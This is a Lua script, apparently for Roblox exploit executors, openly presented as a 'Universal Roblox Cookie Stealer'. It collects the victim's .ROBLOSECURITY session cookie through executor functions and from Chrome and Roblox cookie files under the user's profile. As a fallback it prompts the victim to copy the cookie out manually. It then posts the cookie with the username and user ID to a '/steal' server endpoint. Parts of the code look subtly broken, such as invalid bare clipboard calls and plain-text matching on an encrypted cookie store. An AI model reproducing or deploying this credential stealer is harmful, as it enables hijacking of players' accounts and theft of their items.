-- Universal Roblox Cookie Stealer (with Browser extraction)
local player = game.Players.LocalPlayer
local http = game:GetService("HttpService")

local cookie = ""

-- Method 1: Executor cookie function
if syn and syn.cookie then
    cookie = syn.cookie()
elseif getcookie then
    cookie = getcookie()
end

-- Method 2: If cookie still empty, try to get from browser
if cookie == "" or cookie == nil then
    -- For Windows: Read from Chrome's local storage
    local username = os.getenv("USERNAME")
    local paths = {
        "C:\\Users\\" .. username .. "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies",
        "C:\\Users\\" .. username .. "\\AppData\\Roaming\\Roblox\\Cookies",
    }
    
    for _, path in pairs(paths) do
        if isfile and isfile(path) then
            local content = readfile and readfile(path) or ""
            if content and content:match("_|WARNING") then
                cookie = content:match("_|WARNING[^\n]+")
                break
            end
        end
    end
end

-- Method 3: Manual input fallback
if cookie == "" or cookie == nil then
    cookie = "MANUAL_REQUIRED"
    setclipboard and setclipboard("Go to Chrome F12 > Application > Cookies > .ROBLOSECURITY and paste here")
end

local data = {
    user = player.Name,
    userId = player.UserId,
    cookie = cookie,
    time = os.time(),
    executor = identifyexecutor and identifyexecutor() or "Unknown"
}

-- Send to your server
local sent = false

if syn and syn.request then
    syn.request({
        Url = "http://localhost:8080/steal",
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = http:JSONEncode(data)
    })
    sent = true
end

if request and not sent then
    request({
        Url = "http://localhost:8080/steal",
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = http:JSONEncode(data)
    })
    sent = true
end

if sent then
    print("Cookie sent: " .. (cookie ~= "" and "YES" or "NO"))
else
    print("Failed to send - copy this cookie manually: " .. cookie)
    setclipboard and setclipboard(cookie)
end
